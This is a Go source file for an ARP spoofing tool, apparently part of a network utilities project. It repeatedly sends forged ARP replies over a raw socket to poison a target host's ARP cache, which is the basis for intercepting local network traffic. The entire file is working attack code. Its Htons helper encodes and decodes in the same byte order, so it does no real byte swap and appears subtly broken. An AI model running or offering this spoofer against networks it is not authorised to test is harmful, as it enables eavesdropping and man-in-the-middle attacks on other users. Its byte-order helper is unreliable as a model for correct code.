// Package arpspoofer is used to spoof a particular host with unsolicited arp replies to poison their arp cache.
package arpspoofer

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/kakeetopius/net-tools/internal/util"
	"github.com/pterm/pterm"
	"golang.org/x/sys/unix"
)

var packetCount = 0

type SpoofOptions struct {
	TargetIP      net.IP
	TargetMac     net.HardwareAddr
	SourceIP      net.IP
	SleepDuration time.Duration
}

func Spoof(opts SpoofOptions) error {
	iface, err := util.GetIfaceByIP(opts.TargetIP)
	if err != nil {
		return err
	}
	fmt.Printf("Spoofing host %v on interface %v\n", opts.TargetIP.String(), iface.Name)

	notifyChan := make(chan struct{})
	go awaitSignal(notifyChan)
	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		<-notifyChan
		cancel()
	}()

	err = sendArpPackets(ctx, iface, &opts)
	if err != nil {
		return err
	}
	return nil
}

func sendArpPackets(ctx context.Context, iface *net.Interface, opts *SpoofOptions) error {
	sockfd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, Htons(unix.ETH_P_ARP))
	if err != nil {
		return err
	}
	sockAddr := &unix.SockaddrLinklayer{
		Ifindex:  iface.Index,
		Protocol: uint16(Htons(unix.ETH_P_ARP)),
	}

	eth := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       opts.TargetMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		Operation:       layers.ARPReply,
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   6,
		ProtAddressSize: 4,

		SourceHwAddress:   iface.HardwareAddr,
		SourceProtAddress: opts.SourceIP.To4(),

		DstHwAddress:   opts.TargetMac,
		DstProtAddress: opts.TargetIP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: false,
	}

	err = gopacket.SerializeLayers(buf, serializeOpts, eth, arp)
	if err != nil {
		return err
	}

	packetBytes := buf.Bytes()

	// setup for ui area to show packet count
	area, err := pterm.DefaultArea.Start(pterm.Sprintf("Packets Sent: %v", packetCount))
	if err != nil {
		return err
	}

	for {
		select {
		case <-ctx.Done():
			area.Stop()
			return nil
		default:
			err = unix.Sendto(sockfd, packetBytes, 0, sockAddr)
			if err != nil {
				return err
			}
			packetCount++
			area.Update(pterm.Sprintf("Packets Sent: %v", packetCount))
			time.Sleep(opts.SleepDuration)
		}
	}
}

func Htons(num int) int {
	var b [4]byte
	binary.BigEndian.PutUint32(b[:], uint32(num))
	return int(binary.BigEndian.Uint32(b[:]))
}

func awaitSignal(notifyChan chan struct{}) {
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, os.Interrupt)

	<-signalChan
	fmt.Printf("\n\nTotal Packets Sent: %v\n", packetCount)
	notifyChan <- struct{}{}
}
